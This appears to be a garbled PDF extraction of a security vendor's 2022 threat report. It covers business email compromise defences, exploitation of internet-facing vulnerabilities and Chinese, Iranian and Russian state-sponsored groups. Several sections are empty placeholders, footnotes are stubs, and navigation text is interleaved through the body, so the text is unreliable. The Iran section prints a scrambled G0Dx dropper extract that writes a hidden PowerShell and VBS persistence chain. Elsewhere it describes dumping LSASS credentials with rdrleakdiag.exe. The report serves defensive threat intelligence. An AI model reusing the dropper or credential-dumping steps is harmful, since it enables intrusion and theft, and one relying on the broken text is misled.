In the first half of 2022, Secureworks incident responders saw a 27% year-on-year increase compared to the same period for 2021. These incidents continue to display simple but effective techniques that are largely unchanged from those reported in the 2021 State of the Threat Report. In most cases, a user at the victim organization was compromised through a phishing email that directed the user to a credential-stealing site controlled by the threat actor. In a few cases,

Defending against BEC requires a layered approach:
- Training to help users understand what BEC is, how it typically happens, and how to spot it.
- Financial controls to ensure that any deviation from established payment routes is a multi-step process to ensure that suspicious changes to bank details or purchase requests are flagged.
- Email controls including MFA, rules to alert on sequential logins from unusual locations and email rule changes, and web proxy and DNS controls to identify connections to suspicious domains that could be hosting a credential-harvesting site.
- Response training so that the organization knows how to react if a BEC incident is discovered. Incident response planning should include arrangements for reporting to law enforcement and financial institutions, as time is a critical

---

## Exploitation of Remote Services is Now the Most Common Access Vector

*(Content continues in exact accordance with PDF extraction)*

---

## Hostile Government-Sponsored Actor Activity Shows a Regional Focus

*(Content continues in exact accordance with PDF extraction)*

---

## Defense Evasion Offers Its Own Detection Opportunities

*(Content continues in exact accordance with PDF extraction)*

---

## Conclusion

*(Content continues in exact accordance with PDF extraction)*

---

## The Secureworks View of the Threat

*(Content continues in exact accordance with PDF extraction)*

---

[^1]: Learnings reference source information from Secureworks.
[^2]: GOLD ULRICK designation by Secureworks CTU.
[^3]: GOLD LOUNGE designation by Secureworks CTU.
[^4]: U.S. Treasury Office of Foreign Assets Control (OFAC) sanctions.
[^5]: GOLD DRAKE designation by Secureworks CTU.
[^6]: LockBit ransomware family reference.
[^7]: Virtual currency mixer mechanism.
[^8]: GOLD BLACKBURN designation by Secureworks CTU.
[^9]: U.S. State Department reward announcement in May.
[^10]: DOJ unsealing of indictment.
[^11]: Conti Leaks internal chat logs.
[^12]: Operation TOURNIQUET Europol-coordinated action.
[^13]: GOLD MYSTIC designation by Secureworks CTU.
[^14]: Ahnlab reporting reference.
[^15]: GOLD SOUTHFIELD designation by Secureworks CTU.
[^16]: Kaseya ransomware attack reference.
[^17]: Law enforcement takedown effort.
[^18]: Russian FSB arrests report.
[^19]: CTU sample compilation analysis.
[^20]: Russian authorities custody statement.
[^21]: GOLD BLAZER designation by Secureworks CTU.
[^22]: GOLD HAWTHORNE designation by Secureworks CTU.
[^23]: GOLD MATADOR designation by Secureworks CTU.
[^24]: GOLD TOMAHAWK designation by Secureworks CTU.
[^25]: GOLD RAINFOREST designation by Secureworks CTU.
[^26]: GOLD CRESTWOOD designation by Secureworks CTU.
[^27]: Emotet self-propagation feature.
[^28]: Conti operator involvement in Emotet return.
[^29]: GOLD LAGOON designation by Secureworks CTU.
[^30]: GOLD SWATHMORE designation by Secureworks CTU.
[^31]: Sliver post-exploitation framework.
[^32]: WhisperGate wiper malware.
[^33]: GOLD PRELUDE designation by Secureworks CTU.
[^34]: GOLD ZODIAC designation by Secureworks CTU.
[^35]: Raccoon group development suspension announcement.
[^36]: FBI reported losses October 2013 - December 2021.
[^37]: FBI adjusted losses for 2021.

---

7 Own Detection Opportunities factor when attempting to recover stolen funds.
the threat actors were able to bypass multi-factor authentication by
tricking the user or by enrolling their own device (see page 63).
07
08 Conclusion
Threat actors have realized that organizations implement controls to
flag external emails as potentially suspicious, and in response are often
08 The Secureworks
leveraging compromised accounts to send internal phishing emails as
09
View of the Threat
these are more likely to be trusted, especially where the compromised
account belongs to a senior executive at the company.
2022 State of the Threat: A Year in Review 30

05
01 Letter From Our CTIO Exploitation of Remote Services
is Now the Most Common
Executive Summary
02
and Key Findings
Access Vector
Ransomware Remains the
03
Primary Strategic Threat
Exploitation of vulnerabilities in internet-facing systems became the by the need to generate profit or keep their tools relevant—to
Ransomware Enablers: most common initial access vector (IAV) observed in Secureworks promptly implement new exploit code. Debates about responsible
04
Loaders and Infostealers
incident response engagements during 2021. It remained that way disclosure often miss the fact that even where a patch exists, the
in the first part of 2022, replacing 2020's top IAV of credential- process of patching a vulnerability in an enterprise environment is far
based attacks. more complex and slower than the process for threat actors or OST
Exploitation of Remote
05 Services is Now the Most developers of weaponizing publicly available exploit code.
Common Access Vector
Threat actors continue to rapidly weaponize new vulnerabilities, while
developers of offensive security tools (OSTs) are also incentivized—
Hostile Government-
06 Sponsored Actor Activity
Shows a Regional Focus
06 50
Third Party
40
Defense Evasion Offers Its
07
Own Detection Opportunities
Vulnerabilities in
30 Internet-Facing
07 Devices
08 Conclusion
20
Credentials
08 The Secureworks 10
09 View of the Threat Malicious Emails
0
Q1 Q2 Q3 Q4 Q1 Q2 Q3 Q4
2020 2020 2020 2020 2021 2021 2021 2021
Figure 23. Change in observed initial access vector over time. (Source: Secureworks)
2022 State of the Threat: A Year in Review 31

When Does a Vulnerability Prioritizing Vulnerabilities:
01 Letter From Our CTIO
Questions to Ask
Become a Threat?
Executive Summary • Do we use the impacted software and versions? Asset
02 Whenever a new vulnerability becomes publicly known, organizations
and Key Findings
management is a critical component of any good
are forced to make rapid decisions about how they prioritize mitigating
vulnerability management strategy.
it. Some vulnerabilities essentially prioritize themselves: a remote code
Ransomware Remains the execution that is trivial to exploit and impacts internet-facing software
03 Primary Strategic Threat • How feasible is exploitation in a production environment,
used globally is likely to demand a very rapid response. But in other
as opposed to in a research lab? Is a specific configuration
cases, the decision might be less clear-cut.
needed, and what other dependencies might successful
Ransomware Enablers:
04 exploitation rely on?
Loaders and Infostealers
• What is the impact if it is exploited? The ability to arbitrarily
Exploitation of Remote execute code remotely or crash sensitive systems is likely to
05 Services is Now the Most
be of greatest concern.
Common Access Vector
• Is there evidence of active exploitation? If attackers are
Hostile Government- using it, patching will likely become more urgent. And if
06 Sponsored Actor Activity proof of concept exploit code has been published, then
Shows a Regional Focus
06
even if threat actors aren't currently exploiting it, they
probably soon will be.
Defense Evasion Offers Its
07
Own Detection Opportunities • Does a patch exist? If not, what other mitigations exist?
How easy is the patch or mitigation to apply?
07
08 Conclusion
• How business critical are the assets that could be
impacted? What are the consequences of them being
08 The Secureworks exploited? Conversely, what is the impact of taking the
09
View of the Threat
assets offline to patch?
2022 State of the Threat: A Year in Review 32

Focusing on What Matters Don't Spring to Conclusions
01 Letter From Our CTIO
New vulnerabilities often come with a lot of accompanying hype, On March 29, 2022, rumors began circulating about a zero-day
Executive Summary which can distract from understanding the real risk. Social media remote code execution (RCE) vulnerability in the Spring Framework
02
and Key Findings
often exacerbates this, acting as an echo chamber to perpetuate Core component. Early on March 30, a Twitter persona shared a link
unsubstantiated information. In contrast, there are useful resources to a proof-of-concept exploit but quickly deleted their account. The
such as CISA's Known Exploited Vulnerabilities (KEV) catalog38 that vulnerability, CVE-2022-22965, received a severity rating of 9.8 out of
Ransomware Remains the
03
Primary Strategic Threat can help organizations prioritize based on evidence of observed 10 and was soon dubbed 'Spring4Shell'.
exploitation. Similarly, Secureworks Vulnerability Detection
and Response39 (VDR) platform helps organizations make better Like the Log4Shell vulnerability (CVE-2021-44228) that emerged in
Ransomware Enablers:
04 prioritization decisions by combining global context about ease and December 2021, Spring4Shell appeared to have the potential to impact
Loaders and Infostealers
impact of exploitation and threat intelligence about active exploitation many organizations. Spring is considered40 one of the world's most
with local context about the assets operated by the customer. popular Java application development frameworks, meaning that many
Exploitation of Remote Java applications were potentially affected. Secureworks published a
05 Services is Now the Most
Between June 2021 and June 2022, according to VDR data, 13% of Security Advisory containing a measured warning about the availability
Common Access Vector
vulnerabilities carrying CVSSv2 scores rating them as critical (higher of exploit code, recommending that customers identify applications
than 7) had at least one exploit available on ExploitDB, Packetstorm or in their environment that could be affected and monitor Spring's
Hostile Government- GitHub. In contrast, vulnerabilities flagged up as critical using VDR's communication, but noting that CTU researchers were yet to see any
06 Sponsored Actor Activity
various scoring criteria were two and a half times more likely to have post-exploit activity.
Shows a Regional Focus
06
an associated publicly available exploit. This multiplier rose to over
three in the case of the subset of those critical vulnerabilities that CTU
Defense Evasion Offers Its researchers had observed being exploited in the wild.
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 33

In the end, the impact of Spring4Shell appears to have been very Detect the Vulnerability,
01 Letter From Our CTIO
limited. Certain conditions41 had to be met for successful exploitation
Not the Exploit
and a default implementation was not vulnerable. As of this report,
Executive Summary
CTU researchers have seen very few examples of successful CVE-2022-1388, a pre-authentication vulnerability in the BIG-IP
02
and Key Findings
load balancing and security suite that gives an unauthenticated
exploitation. The same was true to a lesser extent for Log4Shell,
attacker remote code execution capability, was made public
which was undoubtedly more serious but also turned out to be
and patched on Wednesday, May 4, 2022. Over the weekend
Ransomware Remains the less easy to exploit42 than originally feared. CTU researchers saw of May 7 and 8, both Horizon3 and Positive Technologies
03
Primary Strategic Threat exploitation of Log4Shell against VMware Horizon and Tableau servers created44 exploits. On May 9, exploit code was published on
GitHub. On May 10, reports were published that some attackers
in some customer environments, and a June 2022 CISA/GCGCYBER
were using Linux root privileges gained through exploitation of
advisory43 noted that exploitation of this vulnerability continues. But
Ransomware Enablers: this vulnerability to delete almost every file on compromised
04
Loaders and Infostealers CTU researchers did not observe mass exploitation of the vulnerability devices, including vital configuration files.
resulting in successful follow-on code execution.
As with all new vulnerabilities, CTU researchers analyzed
Exploitation of Remote CVE-2022-1388 and deployed a network signature to detect
05 Services is Now the Most exploitation traffic. There was clear evidence of a spike in
Common Access Vector
exploit traffic on May 11. However, interestingly, this same exploit
traffic was being caught by a signature CTU researchers wrote
on March 18, 2021, for CVE-2021-22986, a similar vulnerability
Hostile Government- in BIG-IP that allowed undisclosed requests to bypass iControl
06 Sponsored Actor Activity REST authentication. In catching the newer exploit, the older
Shows a Regional Focus
06 signature demonstrated the value of intelligence-driven controls
enabled by well-crafted detection logic.
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 34

01 Letter From Our CTIO
Executive Summary
02
and Key Findings
Ransomware Remains the
03
Primary Strategic Threat
40,000
Ransomware Enablers:
04
Loaders and Infostealers 35,000
30,000
Exploitation of Remote
05 Services is Now the Most 25,000
Common Access Vector
20,000
Hostile Government- 15,000
06 Sponsored Actor Activity
06 Shows a Regional Focus 10,000
5,000
Defense Evasion Offers Its
07
Own Detection Opportunities 0
Jan-21 Feb-21 Mar-21 Apr-21 May-21 Jun-21 Jul-21 Aug-21 Sep-21 Oct-21 Nov-21 Dec-21 Jan-22 Feb-22 Mar-22 Apr-22 May-22 Jun-22 Jul-22
07
08 Conclusion
08 The Secureworks
09
View of the Threat
Figure 24. IDS detections – CVE-2021-22986 and CVE-2022-1388. (Source: Secureworks)
2022 State of the Threat: A Year in Review 35

06
01 Letter From Our CTIO Hostile
Government-
Executive Summary
02
and Key Findings
Sponsored Actor
Ransomware Remains the
03
Primary Strategic Threat
Activity Shows a
Ransomware Enablers:
Regional Focus
04
Loaders and Infostealers
Exploitation of Remote
05 Services is Now the Most Government-sponsored threat group activity continues to be driven by
Common Access Vector
geopolitical considerations. For Russia, that has primarily meant Ukraine
and other near neighbors. Both Iran and China have largely maintained
Hostile Government- their traditional geographical points of focus, although CTU researchers
06 Sponsored Actor Activity have observed some targeting of organizations in Europe and North
Shows a Regional Focus
06
America. North Korea, in contrast, has concentrated on revenue
generation, targeting a variety of countries.
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 36

01 Letter From Our CTIO
Executive Summary
02
and Key Findings
Ransomware Remains the
03
Primary Strategic Threat
Ransomware Enablers:
04
Loaders and Infostealers
Exploitation of Remote
05 Services is Now the Most
Common Access Vector
Hostile Government-
06 Sponsored Actor Activity
China
Shows a Regional Focus
06
A Strategic Threat
Defense Evasion Offers Its
07
Own Detection Opportunities
Main Motivations:
07 Espionage
08 Conclusion
Intellectual Property
Theft
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 37

01 Letter From Our CTIO China
Executive Summary
02 and Key Findings Chinese government-sponsored groups are some of the most prolific Hiding in the Noise
and well-resourced threats facing organizations worldwide. The
Chinese government uses its cyber capabilities, typically operated, or In the last twelve months there has been a continuing trend of Chinese
Ransomware Remains the
03 tasked by the Ministry of State Security (MSS) or People’s Liberation threat groups conducting harder-to-attribute operations against
Primary Strategic Threat
Army (PLA) to gather political and military intelligence, steal intellectual a more select range of targets. However, those targeted attacks
property, and spy on individuals of interest. are often conducted to appear opportunistic, for example by using
Ransomware Enablers: techniques also favored by cybercriminal threats such as ransomware
04
Loaders and Infostealers
China’s 14th 5-year plan (2021-2025) was formally adopted in March groups. One example of this is exploitation of remote services for initial
2021 and, along with other initiatives such as Made in China 2025, access.
emphasizes the need for modernization and innovation in key industrial
Exploitation of Remote
05 Services is Now the Most sectors. CTU researchers have observed Chinese threat groups target Chinese government-sponsored threat groups remain quick to respond
Common Access Vector organizations in most of those key industries, as well as supporting when new exploit code is available for internet-facing applications
organizations such as legal firms, as China continues to leverage its such as Microsoft Exchange. Over the past year, they have been
offensive cyber capabilities in the pursuit of first regional and then reported as exploiting zero-day vulnerabilities against SolarWinds
Hostile Government-
06 Sponsored Actor Activity global hegemony. Serv-U FTP software45 and ZOHO ManageEngine ADSelfService46,
06 Shows a Regional Focus as well as an elevation of privilege zero-day in the Microsoft Win32k
Chinese groups have also undertaken a degree of tasking in relation kernel driver47.
to the war in Ukraine, monitoring both Russia and Ukraine. Use of
Defense Evasion Offers Its
07 Own Detection Opportunities HeaderTip malware against Ukraine has been attributed by third-party Their use of 'living off the land' techniques and common tooling,
researchers to Chinese threat group Scarab. such as Cobalt Strike also complicates attribution of Chinese threat
07 group activity. In one intrusion in mid-2022, CTU researchers saw a
08 Conclusion probable Chinese threat actor using the built-in Windows executable
rdrleakdiag.exe to dump the Local Security Authority Subsystem
08 The Secureworks Service (LSASS) process memory for credential extraction (see figure
09
View of the Threat 25). Rdrleakdiag.exe is a legitimate Microsoft resource leak diagnostic
tool that can be abused by threat actors.
2022 State of the Threat: A Year in Review 38

It would be easy to mistake BRONZE STARLIGHT activity for routine
01 Letter From Our CTIO cybercrime. However, HUI Loader was also used by the A41APT
group49 against an organization in Japan to load the SodaMaster
remote access trojan (RAT). CTU researchers associate A41APT with
Executive Summary
02 and Key Findings the BRONZE RIVERSIDE50 (also known as APT10) espionage group
based on overlapping tactics, techniques, and procedures (TTPs).
Ransomware Remains the
03 This and other tool overlaps suggest a close relationship between the
Primary Strategic Threat Figure 25. LSASS process dumped using rdrleakdiag (Source: Secureworks)
BRONZE RIVERSIDE and BRONZE STARLIGHT groups. The victimology,
short lifespan of each ransomware family, and access to malware
Ransomware Enablers: used by government-sponsored threat groups suggest that BRONZE
04
Loaders and Infostealers This deliberate use of techniques that blur the line separating
STARLIGHT's main motivation may be intellectual property theft or
opportunistic, financially motivated cybercrime and targeted espionage
cyber espionage, rather than financial gain. The ransomware could
has been taken further by at least one probable government-
Exploitation of Remote be a deliberate tactic to cover their tracks and distract incident
sponsored Chinese threat group, BRONZE STARLIGHT48. The group
05 Services is Now the Most responders from identifying the threat actors’ true intent, reducing the
Common Access Vector has been associated with intrusions involving the deployment of
likelihood of attributing the activity to China.
LockFile, AtomSilo, Rook, Night Sky, and Pandora ransomware variants.
Hostile Government-
BRONZE STARLIGHT has been observed using the HUI Loader malware
06 Sponsored Actor Activity
Shows a Regional Focus during these attacks. HUI Loader is executed via DLL side-loading to
06
decode a third file containing an encrypted payload, usually Cobalt
Strike, that is also deployed to the compromised host. The /rest/2/
Defense Evasion Offers Its
07 meetings HTTP POST URI shown in figure 26 is common across
Own Detection Opportunities
BRONZE STARLIGHT activity but CTU researchers have not seen it
07 anywhere else.
08 Conclusion
Figure 26. BRONZE STARLIGHT Cobalt Strike payload configuration information.
(Source: Secureworks)
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 39

Use of DLL search order hijacking to get a malicious DLL to decode
New Techniques,
01 Letter From Our CTIO and load various payloads, such as PlugX or Cobalt Strike, is typical of
Greater Sophistication
BRONZE PRESIDENT. The threat group puts effort into varying the DLL
loaders, which are highly obfuscated and rarely stay the same from
Executive Summary
02 and Key Findings Not all Chinese threat group activity aims to blend in with general one campaign to the next. In another example53, BRONZE PRESIDENT
internet noise. The sophistication levels displayed by certain Chinese
targeted Russian speakers with a fake PDF that downloaded a decoy
threat groups over the past year has increased, likely in response
document as well as files for a DLL search order hijack, and ultimately
Ransomware Remains the to better detection capability in target environments and to public
03 decoded and ran a PlugX binary. The PlugX payload would only exist on
Primary Strategic Threat
attribution of activity, for example, the formal attribution51 to China
disk as an encrypted blob of data. The loader will decrypt it in memory
by The White House of malicious cyber activity. In particular, CTU
and then pass execution to the payload.
Ransomware Enablers: researchers have observed new loading techniques and more
04
Loaders and Infostealers obfuscation of code and infrastructure.
In a BRONZE UNIVERSITY54 attack that deployed ShadowPad, the
threat actor again used again a DLL search order hijack to load
For example, in one attack on a Japanese organization, BRONZE
Exploitation of Remote the malware. As part of this execution chain, the ShadowPad DLL
05 Services is Now the Most PRESIDENT52 used a malicious PowerPoint file to drop an executable loader checks for specific bytes in its parent process (log.exe). If
Common Access Vector and a DLL file to disk. The executable file imports the DLL, which
the loader finds these bytes, it 'patches' them with an instruction to
decodes an embedded Cobalt Strike Beacon and loads it into memory
call a specific function in the DLL loader. Figure 28 shows this code
(figure 27).
Hostile Government- in a sample (MD5: 3e372906248b215ea0ee853cb4e29dd8) that a
06 Sponsored Actor Activity submitter in Taiwan uploaded to VirusTotal in September. The encrypted
Shows a Regional Focus
06 ShadowPad payload was hidden in the Windows registry.
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat
Figure 28. ShadowPad patching function. (Source: Secureworks)
Figure 27. BRONZE PRESIDENT Cobalt Strike Beacon shellcode in memory.
(Source: Secureworks)
2022 State of the Threat: A Year in Review 40

During a January 2022 incident response engagement, Secureworks
ShadowPad Continues
01 Letter From Our CTIO CTU researchers discovered that BRONZE UNIVERSITY had used
to be Popular
this three-file ShadowPad execution chain in November 2021. Initial
access was via a server running a vulnerable version of ManageEngine
Executive Summary
02 The ShadowPad55 advanced modular RAT is now used by over ten
and Key Findings ADSelfService Plus. The threat actor exploited CVE-2021-405393,
different Chinese threat groups. This consolidates its position alongside
an authentication bypass vulnerability affecting ManageEngine
PlugX as one of the most prevalent RATs used by multiple Chinese
ADSelfService Plus software builds up to version 6113 and deployed the
Ransomware Remains the threat groups.
03 China Chopper web shell.
Primary Strategic Threat
The majority of ShadowPad samples analyzed by CTU researchers use
The threat actor used a three-file execution chain to deploy variants
Ransomware Enablers: two-file execution chains, where the encrypted ShadowPad payload is of ShadowPad, first to the initial server to gain a foothold and then to
04
Loaders and Infostealers embedded within the DLL loader. However, CTU researchers identified
other servers in the network. The threat actor used ShadowPad for
campaigns attributed to the BRONZE UNIVERSITY threat group that
reconnaissance, credential harvesting, and to control the compromised
used a three-file execution chain, with the encrypted ShadowPad
Exploitation of Remote hosts, including for further information gathering.
05 Services is Now the Most payload dropped as a separate file.
Common Access Vector
Hostile Government-
06 Sponsored Actor Activity
Shows a Regional Focus
06
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks Figure 29. Timeline of ShadowPad execution, service creation, and payload injection. (Source: Secureworks)
09
View of the Threat
2022 State of the Threat: A Year in Review 41

01 Letter From Our CTIO
Executive Summary
02
and Key Findings
Ransomware Remains the
03
Primary Strategic Threat
Ransomware Enablers:
04
Loaders and Infostealers
Exploitation of Remote
05 Services is Now the Most
Common Access Vector
Hostile Government-
06 Sponsored Actor Activity Iran
06
Shows a Regional Focus
Traditional Targeting
Defense Evasion Offers Its
07
Own Detection Opportunities
Main Motivations:
07 Espionage
08 Conclusion
Monitoring dissidents
Sabotage
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 42

Iran
01 Letter From Our CTIO
Iranian APT group activity overall remained focused on traditional the Islamic Revolutionary Guard Corps (IRGC) as providing malware
Executive Summary
02 targets: Israel, other Middle Eastern countries, and dissidents at home development services in support of COBALT FIRESIDE59 (also known
and Key Findings
and abroad amongst its diaspora community. Over the year, links as Tortoiseshell and Imperial Kitten). Threat actors within COBALT
between certain groups and government entities became clearer. FIRESIDE have been using the Facebook platform to approach targets
Ransomware Remains the Some groups continued the use of pseudo-ransomware and tunneling before moving the conversations off-platform to other mediums (such
03
Primary Strategic Threat
techniques were used in a wide variety of attacks. as email, messaging and collaboration services, and websites) to
distribute malware to the targets.
Ransomware Enablers: Iranian Group Links to Government
04
Loaders and Infostealers In addition, a grand jury indictment in October 2021 in the U.S. District
Become Clearer
Court for the Southern District of New York of two contractors of
The tasking of COBALT ULSTER56, also known as Seedworm Emennet Pasargad also highlighted connections between supposedly
Exploitation of Remote
05 Services is Now the Most or MuddyWater, became less muddy in January 2022 when a independent cybersecurity companies in Iran and the Iranian
Common Access Vector publication57 from U.S. Cyber Command's Cyber National Mission government. The contractors, both Iranian nationals, were indicted
Force attributed the group to the Iranian Ministry of Intelligence for computer intrusion, computer fraud, voter intimidation, interstate
and Security (also known as MOIS or VAJA). The reporting refers to threats, and conspiracy offenses for their alleged participation in a
Hostile Government-
06 Sponsored Actor Activity COBALT ULSTER as a "subordinate element", which leaves open the campaign aimed at influencing and interfering with the 2020 U.S.
06 Shows a Regional Focus possibility that MOIS may direct the group but not directly employ it. Presidential Election. The messages were designed to appear as if
they had been sent60 by a U.S. far-right political activist group known
Contracting out to commercial contractors in Iran is a common as the Proud Boys.
Defense Evasion Offers Its
07 Own Detection Opportunities operating model. In July 2021, Facebook identified58 commercial
entity Mahak Rayan Afraz (MRA), an IT company in Tehran with ties to
07
08 Conclusion
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 43

Iranian Groups Love to Tunnel
01 Letter From Our CTIO
CTU researchers observed COBALT MIRAGE61 using ngrok and Fast COBALT LYCEUM65 used MilanRAT for DNS tunneling for C2
Executive Summary Reverse Proxy for tunneling in its ransomware campaign against U.S. communication. The group debuted MilanRAT in June 2021 in a
02
and Key Findings
targets. Third-party reporting62 also reinforced the extent to which campaign against Israeli targets, in which it set up a spoof website
Iranian groups make use of tunneling tools. Open source tunneling impersonating Israel-based software company Chip PC Technologies. It
tools employed by COBALT ULSTER were reported to include Chisel, used this website in two infection chains that ended in the deployment
Ransomware Remains the
03
Primary Strategic Threat Secure Socket Funneling (SSF), Ligolo and SharpChisel. of MilanRAT. This formed part of a pivot towards targeting Israel.
Ngrok has also been used by COBALT FOXGLOVE63 since at least
Ransomware Enablers: • C:\ProgramData\MsNpENg\
04 2020 in phishing attacks and by COBALT AGORA64. This latter group
Loaders and Infostealers • C:\ProgramData\MsNpENg\Database.MDF
focuses on organizations in the United Arab Emirates, and in November
• C:\ProgramData\MsNpENg\Log
debuted new malware that CTU researchers refer to as G0Dx. G0Dx • C:\ProgramData\MsNpENg\Log\[a-z0-9]{8}d
Exploitation of Remote provides basic RAT functionality: file upload, file download, and arbitrary • C:\ProgramData\MsNpENg\Log\[a-z0-9]{8}f
05 Services is Now the Most • C:\ProgramData\MsNpENg\Log\[a-z0-9]{8}g
command execution via cmd.exe. It communicates with C2 servers via
Common Access Vector • C:\ProgramData\MsNpENg\Log\[a-z0-9]{8}s
HTTP and DNS.
• C:\ProgramData\MsNpENg\MsNpENg
• C:\ProgramData\MsNpENg\curent.txt
Hostile Government-
06 Sponsored Actor Activity
06 Shows a Regional Focus f f h h . . W W r r i i t t e eL Li i n n e e ( ( " "$ $ d d a e t c a o d - e d [ S - y s [ t S e y m s . t C e o m n . v T e e r x t t ] . : E : n F c r o o d m i B n a g s ] e : 6 : 4 U S T t F r 8 i . n G g e ( t " S + t " r \ i " n [ g B ($ A d S a E ta 6 ) 4 " ) E ; NCODED POWERSHELL PAYLOAD]""+")"); Figure 31. Files created by MilanRAT. (Source: Secureworks)
fh.Writeline("$path - $env:ALLUSERSPROFILE");
fh.WriteLine("New-Item -Path $path"+"'\\Windows'"+" -ItemType Directory > $null");
fh.WriteLine("$decoded > $path"+"'\\Windows\\System.ps1'");
fh.WriteLine("$vbln1-'set objsh- CreateObject(\"WScript.Shell\")'");
Defense Evasion Offers Its % f p h r . o W g r r i a t m eL da i t n a e % (" \\ $ W v i b n l d n o 2- w ' s o \ b \ i S s y h s . t r e u m n . p \ s " 1 p \ o " w , e 0 r , s h f e a l l l s . e e ' x " e ) ; -exec bypass -windowstyle hidden -NonInteractive -noprofile -FILE A new cluster of Iranian activity emerged in June 2022. It uses a
07 fh.Writeline("echo $vbln1 > C:\\ProgramData\\Windows\\runfile.vbs");
Own Detection Opportunities fh.WriteLine("echo $vbln2 >> C:\\ProgramData\\Windows\\runfile.vbs"); .NET based DNS Backdoor referred to as DnsSystem, thought to be
fh.Close();
a customized version of the DIG.net open-source tool. The malware
07
Figure 30. Code extract from a G0Dx dropper. (Source: Secureworks) communicates via DNS tunneling, leveraging DNS queries to exchange
08 Conclusion
C2 traffic with an adversary controlled nameserver. However, in
contrast to some third-party reporting, CTU researchers do not
08 The Secureworks associate this activity with COBALT LYCEUM.
09
View of the Threat
2022 State of the Threat: A Year in Review 44

Iranian Ransomware Continues,
01 Letter From Our CTIO
With Limited Impact
Executive Summary
02 Ransomware has continued to develop as a theme across Iranian In November 2021, U.S., Australian, and British government agencies
and Key Findings
threat group activity in the last 12 months, although it is not always issued a joint advisory69 detailing exploitation since at least March
clear what the attacks are intended to achieve. Often, they appear to 2021 of Fortinet vulnerabilities by an Iranian group in order to gain initial
Ransomware Remains the be used for disruption rather than financial gain. access to systems. The group also exploited the Microsoft Exchange
03
Primary Strategic Threat
ProxyShell vulnerability since at least October 2021 for initial access.
Over the past year, Secureworks incident responders have investigated CTU researchers attribute the activity detailed in the advisory to
Ransomware Enablers: COBALT MIRAGE ransomware attacks against organizations in Israel, COBALT MIRAGE.
04
Loaders and Infostealers the U.S., Europe, and Australia. Elements of COBALT MIRAGE activity
were reported as PHOSPHORUS66 and TunnelVision67, and the group COBALT MIRAGE's ransomware attacks exploit popular remote code
is thought linked to COBALT ILLUSION68 (which predominantly uses vulnerabilities (like ProxyShell or Log4Shell) to obtain access, deploy
Exploitation of Remote
05 Services is Now the Most persistent phishing campaigns to obtain initial access in espionage- tunneling tools including ngrok and FRP, and finally use BitLocker and/
Common Access Vector related campaigns). or DiskCryptor to attempt to encrypt systems, not always successfully.
Hostile Government-
06 Sponsored Actor Activity
Shows a Regional Focus
06
Defense Evasion Offers Its
07
Own Detection Opportunities
07
• Exploit Proxy Shell on • Activate DefaultAccount
08 Conclusion Exchange server • Deploy scripts/tunneling tools • Activate BitLocker on • Send ransom note to printer
three hosts
• Drop web shells • Move laterally
08 The Secureworks
09
View of the Threat
ON OR BEFORE 2022-01-06 2022-01-06 THROUGH 2022-01-10
Figure 32: COBALT MIRAGE actions in a January 2022 intrusion leading to use of BitLocker. (Source: Secureworks)
2022 State of the Threat: A Year in Review 45

COBALT MIRAGE also carries out espionage activity, some of which
01 Letter From Our CTIO may also incorporate ransomware activity. However, while the group
appears to have had a reasonable level of success gaining initial
access to a wide range of targets, its ability to capitalize on that
Executive Summary
02
and Key Findings access for financial gain or intelligence collection appears limited. Even
so, at a minimum, COBALT MIRAGE's ability to use publicly available
encryption tools for ransomware operations and mass scan-and-exploit
Ransomware Remains the
03 activity to compromise organizations creates an ongoing threat.
Primary Strategic Threat
This group sits alongside several other Iranian threat groups that are
Ransomware Enablers: also now targeting Israel with both espionage operations and disruptive
04
Loaders and Infostealers
campaigns under the guise of ransomware attacks. These include
groups like N3tw0rm, COBALT SHADOW70 (also known as Agrius), and
Exploitation of Remote hack and leak operations like Moses Staff.
05 Services is Now the Most
Common Access Vector
Moses Staff, tracked by CTU researchers as COBALT SAPLING71,
portrays itself as a pro-Palestinian group intent on using cyberattacks
and content on its leak site to intimidate entities in Israel. CTU
Hostile Government-
06 Sponsored Actor Activity researchers assess it more likely that this operation is part of ongoing
Shows a Regional Focus
06 efforts by Iran-linked pseudo-ransomware groups to harass and
disrupt Israeli businesses. COBALT SAPLING is another group using
Defense Evasion Offers Its ransomware style malware for disruption rather than financial gain,
07
Own Detection Opportunities having used72 PyDcrypt, DCSrv, and Strifewater73 against targets
in Israel. While COBALT SAPLING is known to leak data from their
07
own intrusions, it is also possible that some of the data listed on the
08 Conclusion
leak site may have been obtained from other sources or intrusions
conducted by other threat actors.
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 46

01 Letter From Our CTIO
Executive Summary
02
and Key Findings
Ransomware Remains the
03
Primary Strategic Threat
Ransomware Enablers:
04
Loaders and Infostealers
Exploitation of Remote
05 Services is Now the Most
Common Access Vector
Hostile Government-
06 Sponsored Actor Activity Russia
06
Shows a Regional Focus
The Near Abroad and a Nod
Defense Evasion Offers Its to the 'Problems' of Cybercrime
07
Own Detection Opportunities
Main Motivations:
07
08 Conclusion Espionage
Hybrid Warfare
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 47

01 Letter From Our CTIO Russia
Executive Summary
02 and Key Findings Russia's advanced cyber capabilities support the aims of its foreign What the War in Ukraine
policy to counter Western influence at home and on its near neighbors,
has Revealed About Russia’s
and to advance Russia's position as a leader in world affairs. Russia
Ransomware Remains the
03 regards the West, especially the North Atlantic Treaty Organization Cyber Capabilities
Primary Strategic Threat
(NATO) alliance, as an ongoing and central threat to the national
interests of the Russian Federation. In the run-up to the Russian invasion of Ukraine there were valid
Ransomware Enablers: concerns that destructive cyber capabilities would be deployed on a
04
Loaders and Infostealers
wide-scale against Ukrainian critical infrastructure and spread beyond
Ukraine's borders, as occurred with NotPetya75 in 2017.
Combatting Cybercrime…
Exploitation of Remote
Selectively
05 Services is Now the Most Those fears appeared unfounded as of late June, with the wiper
Common Access Vector
